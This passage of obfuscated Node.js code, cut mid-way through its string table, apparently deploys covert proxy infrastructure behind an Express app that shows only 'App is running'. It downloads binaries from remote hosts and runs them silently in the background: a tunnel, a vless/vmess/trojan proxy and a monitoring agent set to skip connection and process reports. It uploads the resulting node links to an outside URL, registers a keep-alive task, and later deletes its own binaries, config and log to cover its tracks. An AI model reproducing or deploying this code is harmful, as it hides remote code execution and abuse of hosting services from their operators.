20tunnel','unshift','express','false','filter','\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20tunnel:\x20','exec','SUB_PATH','aarch64','listen','utf-8','14pcounY','UPLOAD_URL','taskkill\x20/f\x20/im\x20','map','https://amd64.ssss.nyc.mn/bot','\x20>\x20nul\x202>&1','/api/add-nodes','App\x20is\x20running','Content-Type','\x20-c\x20\x22','floor','readdirSync','\x20-c\x20','status','3405TUtIas','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','&path=%2Ftrojan-argo%3Fed%3D2560#','mkdirSync','vless','CFPORT','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','freedom','match','unlinkSync','error','https://arm64.ssss.nyc.mn/v1','\x22\x20>\x20/dev/null\x202>&1','443','stringify','748746mWivYb','ARGO_AUTH','writeFileSync','2096','https://amd64.ssss.nyc.mn/v1','tls','/vmess-argo','tcp','config.json','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','country_code','?security=tls&sni=','length','sub','text/plain;\x20charset=utf-8','127.0.0.1','org','https+local://8.8.8.8/dns-query','NAME','PORT','\x0a\x0atrojan://','NEZHA_SERVER','Error\x20in\x20startserver:','test','SERVER_PORT','Empowerment\x20failed\x20for\x20','Error\x20executing\x20command:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','boot.log','http','\x0a\x20\x20\x20\x20','arm64','https://arm64.ssss.nyc.mn/web','2083','del\x20/f\x20/q\x20','&path=%2Fvless-argo%3Fed%3D2560#','\x20failed:\x20','readFileSync','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','message','Skipping\x20adding\x20automatic\x20access\x20task','2488AoTpkp','config.yaml','application/json','env','util','Error\x20downloading\x20files:','8443','trojan','block','substring','\x20-p\x20','?encryption=none&security=tls&sni=','quic','http\x20server\x20is\x20running\x20on\x20port:','toString','\x20already\x20exists','forEach','get','1558dSqcrX','clear','/api/delete-nodes','isFile','npm\x20running\x20error:\x20','axios','automatic\x20access\x20task\x20added\x20successfully','Subscription\x20uploaded\x20successfully','response','NEZHA_KEY','then','random','/trojan-argo','fileName','basename','CFIP','child_process','https://oooo.serv00.net/add-url','https://amd64.ssss.nyc.mn/web','1091349onHNDl','push','2053','abcdefghijklmnopqrstuvwxyz','\x20-s\x20','75336kJjDsA','.exe\x20>\x20nul\x202>&1','amd','2087','existsSync','chmod','Nodes\x20uploaded\x20successfully'];_0x4c98=function(){return _0x5a94ea;};return _0x4c98();}async function uploadNodes(){const _0x30be3d={_0x3703b2:0x148,_0x336c35:0x1d0,_0x54d930:0x1d1,_0x5dbb2a:0x1e5,_0x2b25d9:0x1b3,_0x324c79:0x170,_0x8fc45f:0x19a,_0x5a6754:0x18d,_0x57fd86:0x1b9},_0x50db08=_0x17b74b;if(UPLOAD_URL&&PROJECT_URL){const _0x536337=PROJECT_URL+'/'+SUB_PATH,_0x4cd67e={'subscription':[_0x536337]};try{const _0x18ccfd=await axios[_0x50db08(_0x30be3d._0x3703b2)](UPLOAD_URL+_0x50db08(0x158),_0x4cd67e,{'headers':{'Content-Type':_0x50db08(0x1b9)}});return _0x18ccfd&&_0x18ccfd['status']===0xc8?(console[_0x50db08(0x153)](_0x50db08(_0x30be3d._0x336c35)),_0x18ccfd):null;}catch(_0x151e37){if(_0x151e37[_0x50db08(_0x30be3d._0x54d930)]){if(_0x151e37[_0x50db08(0x1d1)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x50db08(_0x30be3d._0x5dbb2a)](listPath))return;const _0x5297cf=fs[_0x50db08(_0x30be3d._0x2b25d9)](listPath,_0x50db08(_0x30be3d._0x324c79)),_0x43875d=_0x5297cf[_0x50db08(0x1f5)]('\x0a')[_0x50db08(0x169)](_0x4caec7=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4caec7));if(_0x43875d[_0x50db08(_0x30be3d._0x8fc45f)]===0x0)return;const _0x137241=JSON[_0x50db08(_0x30be3d._0x5a6754)]({'nodes':_0x43875d});try{const _0x33cf98=await axios[_0x50db08(0x148)](UPLOAD_URL+_0x50db08(0x177),_0x137241,{'headers':{'Content-Type':_0x50db08(_0x30be3d._0x57fd86)}});return _0x33cf98&&_0x33cf98[_0x50db08(0x17e)]===0xc8?(console['log'](_0x50db08(0x1e7)),_0x33cf98):null;}catch(_0x2db9d0){return null;}}else return;}}function cleanFiles(){const _0x55f9ad={_0x292211:0x1dd,_0x1742ad:0x15a},_0x14bf64={_0x47d9db:0x1ca,_0x43b1bc:0x153,_0x4aa416:0x178,_0x3eef2c:0x162};setTimeout(()=>{const _0x4aea3c={_0x4ef6bd:0x153},_0x13b8da=_0x122a,_0x2ecbff=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2ecbff[_0x13b8da(_0x55f9ad._0x292211)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2ecbff[_0x13b8da(0x1dd)](phpPath);process['platform']===_0x13b8da(_0x55f9ad._0x1742ad)?exec(_0x13b8da(0x1b0)+_0x2ecbff[_0x13b8da(0x1fc)]('\x20')+_0x13b8da(0x176),_0x3da372=>{const _0x402256=_0x13b8da;console[_0x402256(_0x14bf64._0x47d9db)](),console[_0x402256(_0x14bf64._0x43b1bc)](_0x402256(_0x14bf64._0x4aa416)),console['log'](_0x402256(_0x14bf64._0x3eef2c));}):exec('rm\x20-rf\x20'+_0x2ecbff[_0x13b8da(0x1fc)]('\x20')+'\x20>/dev/null\x202>&1',_0xbf4eb2=>{const _0x4915b5=_0x13b8da;console[_0x4915b5(0x1ca)](),console['log']('App\x20is\x20running'),console[_0x4915b5(_0x4aea3c._0x4ef6bd)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3bac5c={_0x28cc29:0x153,_0x244d79:0x148,_0x2eec1d:0x1da,_0x39fac2:0x1cf},_0x2e132c=_0x17b74b;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2e132c(_0x3bac5c._0x28cc29)](_0x2e132c(0x1b6));return;}try{const _0x332be8=await axios[_0x2e132c(_0x3bac5c._0x244d79)](_0x2e132c(_0x3bac5c._0x2eec1d),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log'](_0x2e132c(_0x3bac5c._0x39fac2)),_0x332be8;}catch(_0x121b4c){return console[_0x2e132c(0x189)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x121b4c[_0x2e132c(0x1b5)]),null;}}async function startserver(){const _0xdb1eeb=_0x17b74b;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3784a9){console[_0xdb1eeb(0x189)](_0xdb1eeb(0x1a4),_0x3784a9);}}startserver()[_0x17b74b(0x164)](_0x178c03=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x178c03);}),app[_0x17b74b(0x16f)](PORT,()=>console['log'](_0x17b74b(0x1c4)+PORT+'!'));
